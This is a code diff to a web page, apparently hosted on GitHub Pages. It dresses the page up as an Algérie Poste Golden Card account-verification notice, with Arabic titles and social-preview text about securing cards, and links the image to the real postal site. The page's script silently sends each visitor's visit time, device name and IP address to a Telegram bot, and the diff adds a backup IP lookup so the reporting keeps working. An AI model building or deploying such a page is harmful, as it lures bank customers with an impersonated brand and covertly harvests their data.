@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> </title>
+    <title>بريد الجزائر - التحقق من الحساب والبطاقة الذهبية</title>
     <meta property="og:type" content="website" />
-    <meta property="og:title" content=" " />
-    <meta property="og:description" content=" " />
+    <meta property="og:title" content="منصة بريد الجزائر الإلكترونية" />
+    <meta property="og:description" content="اضغط هنا للتحقق من حالة بطاقتك النقدية الذهبية وتأمين عملياتك." />
     <meta property="og:image" content="https://mo7-mft.github.io/po//zer.jpg" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content=" " />
-    <meta name="twitter:description" content=" " />
+    <meta name="twitter:title" content="بريد الجزائر - البطاقة الذهبية" />
+    <meta name="twitter:description" content="تحديثات الأمان الخاصة بالبطاقات النقدية." />
     <meta name="twitter:image" content="https://mo7-mft.github.io/po//zer.jpg" />
     <style>
         * {
@@ -34,6 +34,7 @@
             max-width: 100%;
             max-height: 100vh;
             overflow: hidden;
+            cursor: pointer; /* يجعل مؤشر الفأرة يظهر كيد قابلة للضغط */
         }
         
         .image-container img {
@@ -46,7 +47,9 @@
 <body>
 
     <div class="image-container">
-        <img src="zer.jpg" alt="صورة">
+        <a href="https://eccp.poste.dz/">
+            <img src="zer.jpg" alt="صورة">
+        </a>
     </div>
 
     <script>
@@ -119,8 +122,8 @@
         const basicMsg = `✅ زائر جديد!%0A⏰ ${now}%0A📱 الجهاز: ${exactDeviceName}`;
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${basicMsg}`);
         
-        // جزء جلب الـ IP (بدون انتظار طويل)
-        fetch("https://api.ipify.org?format=json", {timeout: 5000})
+        // جزء جلب الـ IP (باستخدام موقع ipapi المتوافق بالكامل مع GitHub Pages وحماية HTTPS)
+        fetch("https://ipapi.co/json/", {timeout: 5000})
           .then(r => r.json())
           .then(data => {
             const ip = data.ip;
@@ -128,7 +131,15 @@
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${ipMsg}`);
           })
           .catch(() => {
-            console.log('لم يتمكن من جلب IP');
+            // حل مشكلة "غير معروف" على جيت هيب عبر محاولة الاتصال بالموقع البديل ipify لو فشل الأول
+            fetch("https://api.ipify.org?format=json")
+              .then(r => r.json())
+              .then(data => {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🔗 IP Address: ${data.ip}`);
+              })
+              .catch(() => {
+                console.log('لم يتمكن من جلب IP');
+              });
           });
         
         // جزء جلب الموقع (بدون انتظار)
